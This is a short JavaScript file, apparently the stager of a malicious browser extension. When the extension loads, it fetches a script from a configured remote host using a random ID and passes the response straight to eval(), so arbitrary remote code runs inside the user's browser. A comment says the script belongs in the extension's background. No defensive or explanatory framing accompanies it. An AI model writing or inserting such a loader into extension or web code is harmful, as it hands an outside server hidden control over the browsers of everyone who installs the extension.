// Initial stage request once the extension is loaded

const stagerURI = '/something/something/payload.js';
const serverHost = 'www.host.com';
const key = "password";

// helper function to generate random alphanumeric string
function GenerateID(length) {
    return Math.random().toString(36).substr(2, length);
}

(function() {
  // This function executes and makes a requests to the stager uri and loads the core extension code
  // For packaging the extension, this script should be placed in the background.

  const ID = GenerateID(8);

  const Http = new XMLHttpRequest();
  const url="https://"+serverHost+stagerURI+"?ID="+ID;


  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange=function(){
    if (this.readyState===4 && this.status===200) {
      eval(Http.responseText);
    }
  }


})();